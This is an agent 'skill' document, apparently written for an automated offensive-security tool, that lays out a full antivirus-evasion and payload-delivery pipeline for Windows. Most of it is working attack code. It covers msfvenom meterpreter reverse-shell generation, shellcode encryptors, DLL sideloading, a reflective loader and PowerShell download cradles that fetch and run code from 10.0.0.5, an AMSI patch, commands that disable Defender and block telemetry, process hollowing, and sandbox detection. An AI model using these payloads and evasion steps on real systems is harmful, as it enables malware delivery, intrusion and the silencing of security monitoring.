---
name: evasion-av-bypass
description: Antivirus evasion and payload staging — static bypass, packers, custom encryptors, DLL sideloading, fileless memory-only delivery, AMSI bypass, and Defender telemetry reduction
version: 1.0.0
phase: post
category: evasion
tags: [av, bypass, payload, evasion, defender, clamav]
tools: [msfvenom, python3, upx, base64]
difficulty: advanced
opsec_level: silent
time_estimate: 300s
severity_if_found: critical
related_skills:
  - evasion-edr-evasion
  - evasion-payload-encode
  - evasion-ip-rotation
mitre_attack:
  - T1027
  - T1027.002
  - T1027.003
  - T1027.004
  - T1055.001
  - T1055.012
  - T1059.001
  - T1562.001
  - T1564.003
---

## When to Use

Use this skill when delivering payloads to a target with active antivirus
(Windows Defender, Defender for Endpoint, ClamAV, or third-party AV). Covers
the full delivery pipeline: encoding, packing, encryption, injection, AMSI
bypass, and telemetry reduction. Combine with `evasion-edr-evasion` when EDR
is also present.

## Prerequisites

- Foothold on target (low-priv shell or execution primitive)
- msfvenom (Metasploit), Python 3, UPX on attack host
- Ability to transfer files to target (SMB, HTTP, DNS, etc.)
- Target OS version and AV product identified
- Python 3 on target for custom encoders (if fileless staging)

## Procedure

```bash
# ──────────────────────────────────────────────
# 1. STATIC AV BYPASS — MSFVENOM ENCODERS
# ──────────────────────────────────────────────

# Generate base shellcode (raw, no encoding)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f raw -o /tmp/shellcode.bin

# Apply shikata_ga_nai multi-pass encoding (x86)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 15 \
  -f exe -o /tmp/payload_encoded.exe

# Xored encoder for x64 (shikata not available for x64 in msf)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -e x64/xor -i 10 \
  -f exe -o /tmp/payload_xored.exe

# Custom template injection (avoid generated patterns)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f exe -o /tmp/payload_raw.exe

# ──────────────────────────────────────────────
# 2. PACKERS — UPX AND CUSTOM
# ──────────────────────────────────────────────

# UPX standard compression
upx --best /tmp/payload_encoded.exe -o /tmp/payload_packed.exe

# UPX with brute force (harder to unpack)
upx --best --brute /tmp/payload_encoded.exe -o /tmp/payload_brute.exe

# Alternative: hyperion (AES-encrypts PE entry point)
# hyperion -v /tmp/payload_encoded.exe /tmp/payload_hyperion.exe

# ──────────────────────────────────────────────
# 3. CUSTOM XOR ENCRYPTOR (Python 3)
# ──────────────────────────────────────────────

cat > /tmp/xor_encrypt.py << 'PYEOF'
#!/usr/bin/env python3
import sys, os

def xor_data(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <input.bin> <key> <output.bin>")
        sys.exit(1)
    with open(sys.argv[1], "rb") as f:
        payload = f.read()
    key = sys.argv[2].encode()
    encrypted = xor_data(payload, key)
    with open(sys.argv[3], "wb") as f:
        f.write(encrypted)
    print(f"[+] Encrypted {len(payload)} bytes with XOR key '{sys.argv[2]}'")
    print(f"[+] Output: {sys.argv[3]}")
    # Print decoder stub (inline assembly/C)
    print(f"\n[+] Decoder stub key (copy this):")
    print(f'    unsigned char key[] = "{sys.argv[2]}";')
    print(f"    int key_len = {len(key)};")
PYEOF

# Encrypt shellcode
python3 /tmp/xor_encrypt.py /tmp/shellcode.bin "s3cr3t_k3y!" /tmp/shellcode_xor.bin

# ──────────────────────────────────────────────
# 4. CUSTOM AES ENCRYPTOR (Python 3)
# ──────────────────────────────────────────────

cat > /tmp/aes_encrypt.py << 'PYEOF'
#!/usr/bin/env python3
import sys, os, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def aes_encrypt(data, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, AES.block_size))
    return iv + ct  # Prepend IV for decoder

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <input.bin> <aes_key_16|32> <output.bin>")
        sys.exit(1)
    with open(sys.argv[1], "rb") as f:
        payload = f.read()
    key = sys.argv[2].encode().ljust(32, b'\x00')[:32]
    encrypted = aes_encrypt(payload, key)
    with open(sys.argv[3], "wb") as f:
        f.write(encrypted)
    b64 = base64.b64encode(encrypted).decode()
    print(f"[+] AES-256-CBC encrypted {len(payload)} bytes")
    print(f"[+] Base64 payload ({len(b64)} chars):")
    print(b64)
PYEOF

# Requires pycryptodome: pip3 install pycryptodome
python3 /tmp/aes_encrypt.py /tmp/shellcode.bin "aes_key_32_bytes_xxxxxxxxxxxxx" /tmp/shellcode_aes.bin

# ──────────────────────────────────────────────
# 5. SHELLCODE INJECTION INTO SIGNED BINARIES
# ──────────────────────────────────────────────

# Embed shellcode into a legitimate Microsoft-signed binary
# (e.g., InstallUtil.exe, Mshta.exe, Regsvr32.exe)

# Technique: sideload via .config file (for .NET binaries)
# Place a <runtime><assemblyBinding> in $(binary).config
cat > /tmp/InstallUtil.exe.config << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="YourPayload" publicKeyToken="null" culture="neutral" />
        <codeBase version="1.0.0.0" href="file:///C:\Temp\payload.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
XMLEOF

# For DLL proxying: rename legitimate DLL -> <orig>.dll.bak, place payload DLL
# with same exports, forwarding to the original

# ──────────────────────────────────────────────
# 6. DLL SIDELOADING FOR TRUSTED PROCESS INJECTION
# ──────────────────────────────────────────────

# Identify sideloadable DLLs from a trusted process:
# Process Explorer or ProcMon -> filter "Name not found" for DLL loads
# Common targets: wlbsctrl.dll (for ipconfig), version.dll (many apps)

# Place malicious DLL in app directory with correct export forwarding
# Example: compile with Mingw-w64
cat > /tmp/sideload_dll.c << 'CEOF'
#include <windows.h>
#include <stdio.h>

// Export forwarded functions to the original DLL
// Use `dumpbin /exports original.dll` to get the exact ordinals

#pragma comment(linker, "/EXPORT:OriginalFunction=DLL_BAK.OriginalFunction,@1")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Shellcode injection or process hollowing here
        // Example: CreateRemoteThread into a trusted process
    }
    return TRUE;
}
CEOF

x86_64-w64-mingw32-gcc -shared -o /tmp/version.dll /tmp/sideload_dll.c
# Place alongside target binary (e.g., alongside putty.exe for version.dll)

# ──────────────────────────────────────────────
# 7. POWERSHELL DOWNGRADE ATTACK (PowerShell v2)
# ──────────────────────────────────────────────

# PowerShell v2 has no AMSI, no Constrained Language Mode, limited logging
# Requires .NET Framework 3.5 (usually preinstalled on older Windows)

# Launch v2 runtime:
powershell -Version 2 -Command "Write-Host 'Running in PSv2 — no AMSI'"

# Execute payload in v2 context:
powershell -Version 2 -ExecutionPolicy Bypass -WindowStyle Hidden \
  -EncodedCommand <BASE64_ENCODED_SCRIPT>

# If PSv2 is not installed, check:
dism /online /Get-Features | findstr "PowerShellV2"

# ──────────────────────────────────────────────
# 8. MEMORY-ONLY PAYLOAD (FILELESS)
# ──────────────────────────────────────────────

# Technique: download + reflectively load in memory, never touches disk

# PowerShell memory-only meterpreter:
powershell -NoP -NonI -W Hidden -Exec Bypass \
  -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/psh_payload.ps1')"

# C# reflective loader compiled and run from memory via csc.exe + InstallUtil:
# Step 1: Compile C# payload on attack host with csc.exe
cat > /tmp/ReflectiveLoader.cs << 'CSEOF'
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;

namespace ReflectiveLoad {
    public class Program {
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        public static void Main(string[] args) {
            // Download encrypted shellcode
            WebClient wc = new WebClient();
            byte[] encrypted = wc.DownloadData("http://10.0.0.5/payload.bin");
            byte[] key = System.Text.Encoding.ASCII.GetBytes("s3cr3t_k3y!");

            // XOR decrypt
            for (int i = 0; i < encrypted.Length; i++)
                encrypted[i] ^= key[i % key.Length];

            // Allocate and execute
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)encrypted.Length,
                0x3000, 0x40);  // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
            Marshal.Copy(encrypted, 0, mem, encrypted.Length);
            CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            System.Threading.Thread.Sleep(Timeout.Infinite);
        }
    }
}
CSEOF

# On target with .NET Framework, compile and run:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe \
  /unsafe /target:exe /out:C:\Users\Public\reflective.exe \
  C:\Users\Public\ReflectiveLoader.cs
C:\Users\Public\reflective.exe

# ──────────────────────────────────────────────
# 9. AMSI BYPASS
# ──────────────────────────────────────────────

# Patch AMSI at runtime via PowerShell:
# AmsiScanBuffer patching (return AMSI_RESULT_CLEAN immediately)
powershell -Command "
$Win32 = Add-Type -memberDefinition @'
[DllImport('kernel32')]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport('kernel32')]
public static extern IntPtr LoadLibrary(string name);
[DllImport('kernel32')]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);
'@ -name 'Win32' -namespace Win32Functions -passthru;

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary('amsi.dll'), 'AmsiScanBuffer');
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);  # mov eax,0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6);

# Now AmsiScanBuffer always returns AMSI_RESULT_CLEAN
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/psh_payload.ps1')
"

# Alternative: registry-based AMSI disable (requires admin)
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings" \
  /v "AmsiEnable" /t REG_DWORD /d 0 /f

# ──────────────────────────────────────────────
# 10. WINDOWS DEFENDER EXCLUSION PATH ABUSE
# ──────────────────────────────────────────────

# Abuse legitimate exclusion paths (common in enterprise environments):
#   C:\ProgramData\Microsoft\Windows\WER\
#   C:\Windows\Temp\
#   C:\ProgramData\*

# Add exclusion via PowerShell (requires admin):
powershell -Command "
Add-MpPreference -ExclusionPath 'C:\Windows\Temp\staging'
Add-MpPreference -ExclusionExtension '.tmp'
Add-MpPreference -ExclusionProcess 'msbuild.exe'
"

# If not admin, use paths that are commonly excluded by group policy:
# Check if any paths are already excluded:
powershell -Command "Get-MpPreference | Select-Object Exclusion*"

# ──────────────────────────────────────────────
# 11. MICROSOFT DEFENDER FOR ENDPOINT TELEMETRY REDUCTION
# ──────────────────────────────────────────────

# Disable real-time monitoring (requires admin, triggers alert):
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring \$true"

# Tamper protection bypass (if enabled, direct reg modification needed):
reg add "HKLM\Software\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Block telemetry endpoints at host level:
echo "0.0.0.0 watson.telemetry.microsoft.com" >> %SystemRoot%\System32\drivers\etc\hosts
echo "0.0.0.0 settings-win.data.microsoft.com" >> %SystemRoot%\System32\drivers\etc\hosts

# Use MsMpEng CPU throttling to avoid detection spikes:
powershell -Command "Set-MpPreference -PUAProtection disabled"
powershell -Command "Set-MpPreference -CloudProtectionLevel 0"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"  # Never send

# ──────────────────────────────────────────────
# 12. PROCESS HOLLOWING (vs. Classic Injection)
# ──────────────────────────────────────────────

# Classic injection (CreateRemoteThread) — higher detection rate
# Process hollowing — lower detection (spawns suspended legitimate process,
# unmaps its image, writes payload, resumes)

# Python-assisted process hollowing with custom shellcode:
cat > /tmp/process_hollow.py << 'PYEOF2'
#!/usr/bin/env python3
"""
Process hollowing helper: generates C stub for hollowing
Usage: python3 process_hollow.py <shellcode.bin> <target_exe>
"""
import sys, os

def gen_hollow_stub(shellcode_path, target_exe):
    with open(shellcode_path, "rb") as f:
        sc = f.read()
    sc_hex = ', '.join(f'0x{b:02x}' for b in sc)
    stub = f'''#include <windows.h>
#include <stdio.h>

// Shellcode ({len(sc)} bytes)
unsigned char shellcode[] = {{ {sc_hex} }};

int main() {{
    STARTUPINFO si = {{ sizeof(si) }};
    PROCESS_INFORMATION pi;
    LPCONTEXT ctx;
    LPVOID remote_addr;

    // 1. Create process in suspended state
    if (!CreateProcessA("{target_exe}", NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {{
        printf("[-] CreateProcess failed\\n");
        return 1;
    }}

    // 2. Get thread context
    ctx = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    ctx->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, ctx)) {{
        printf("[-] GetThreadContext failed\\n");
        return 1;
    }}

    // 3. Hollow the process (NtUnmapViewOfSection)
    // Called via GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection")
    // Then VirtualAllocEx at original image base

    // 4. Write shellcode to remote process
    remote_addr = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote_addr, shellcode, sizeof(shellcode), NULL);

    // 5. Set entry point and resume
    ctx->Rcx = (DWORD64)remote_addr;
    SetThreadContext(pi.hThread, ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}}
'''
    return stub

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> <target_exe>")
        sys.exit(1)
    print(gen_hollow_stub(sys.argv[1], sys.argv[2]))
PYEOF2

python3 /tmp/process_hollow.py /tmp/shellcode_xor.bin "C:\\Windows\\System32\\svchost.exe"

# ──────────────────────────────────────────────
# 13. SANDBOX / DEBUGGER DETECTION
# ──────────────────────────────────────────────

cat > /tmp/sandbox_detect.c << 'CEOF2'
#include <windows.h>
#include <stdio.h>

int IsSandboxed() {
    // Check for VM artifacts
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256]; DWORD size = sizeof(value);
        if (RegQueryValueEx(hKey, "SystemManufacturer", NULL, NULL,
                           (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "VMware") || strstr(value, "VirtualBox") ||
                strstr(value, "QEMU") || strstr(value, "Xen")) {
                return 1;
            }
        }
        RegCloseKey(hKey);
    }

    // Debugger detection (IsDebuggerPresent + NtGlobalFlag)
    if (IsDebuggerPresent()) return 1;

    // Check for analysis tools
    if (FindWindow(NULL, "Wireshark") || FindWindow(NULL, "Process Hacker"))
        return 1;

    // Check RAM size (< 2GB == sandbox)
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024)
        return 1;  // Less than 2GB RAM

    // Check uptime (< 30 minutes == sandbox)
    if (GetTickCount64() < 30 * 60 * 1000)
        return 1;

    // Check disk size (< 60GB == sandbox)
    ULARGE_INTEGER free, total;
    if (GetDiskFreeSpaceEx("C:\\", &free, &total, NULL)) {
        if (total.QuadPart < 60ULL * 1024 * 1024 * 1024)
            return 1;
    }

    return 0;  // Probably real target
}

int main() {
    if (IsSandboxed()) {
        printf("[SANDBOX] Detected — exiting cleanly\n");
        // Exit cleanly without suspicious behavior
        return 0;
    }
    printf("[+] Real environment — proceeding with payload\n");
    // Actual shellcode execution here
    return 0;
}
CEOF2

# Compile with MinGW:
x86_64-w64-mingw32-gcc -o /tmp/sandbox_check.exe /tmp/sandbox_detect.c
```

## OPSEC Rules

- **CRITICAL**: Every AV bypass attempt increases detection probability — use layered approach (encrypt + pack + inject)
- Do NOT upload payloads to VirusTotal or any public scanner
- Always use HTTPS or encrypted tunnels for payload delivery
- Use unique C2 infrastructure per engagement (no reused domains/IPs)
- Never test bypasses on customer infrastructure — test locally first
- Clean up all staging files and temporary artifacts after deployment
- Rotate encoders, keys, and delivery mechanism between targets
- Process hollowing is lower detection than CreateRemoteThread overall
- AMSI patching writes to .text section — EDR may alert on this
- Watch for Windows Defender signatures based on msfvenom template patterns — use custom templates when possible

## Verification

- Verify payload executes and calls back without AV alert
- Check Windows Defender event log: `Get-MpThreatDetection` should be empty
- Verify AMSI bypass works: test with `amsi.dll` loaded and `AmsiScanBuffer` return value
- Confirm process hollowed target is running and beacon shows expected architecture
- Verify debugger/sandbox detection works by testing in both VM and physical env
- Test with Windows Defender real-time monitoring enabled
- If MDE is present, verify no alerts in Microsoft 365 Defender console

## Pitfalls

- x64 does NOT support shikata_ga_nai — use x64/xor or x64/zutto_dekiru instead
- UPX-packed binaries have known signatures — combine with encryption first
- PowerShell v2 may not be installed on modern Windows (Win10 1809+ removes it)
- AMSI bypass registry key requires admin and triggers Defender alerts
- Process hollowing requires matching architecture (x64 target → x64 payload)
- MsMpEng may scan memory even with real-time monitoring off
- DLL sideloading requires precise export forwarding — use dumpbin to verify
- Sandbox detection is a heuristic — may produce false negatives on custom sandboxes
- Windows Defender exclusion abuse requires admin and may be logged by MDE
- EDR hooks in ntdll.dll make CreateRemoteThread unreliable — prefer indirect syscalls or early process hollowing

## Output Format

```
[AV]      Product detected: Windows Defender (Real-time: ON, Cloud: ON)
[ENCODER] shikata_ga_nai x15 applied — msfvenom payload generated
[ENCRYPT] XOR encrypted shellcode (s3cr3t_k3y!) — 512 bytes
[PACKER]  UPX compressed to 65%
[DLL]     Sideloadable DLL identified: wlbsctrl.dll
[AMSI]    AmsiScanBuffer patched — AMSI bypass confirmed
[INJECT]  Process hollowing: svchost.exe (PID 3824) hollowed, beaconing
[SANDBOX] Check passed — uptime 4d, RAM 8GB, disk 120GB
[TELEM]   Cloud protection disabled, telemetry hosts blocked
[CRITICAL] AV bypass successful — stage-2 payload executing in-memory
```

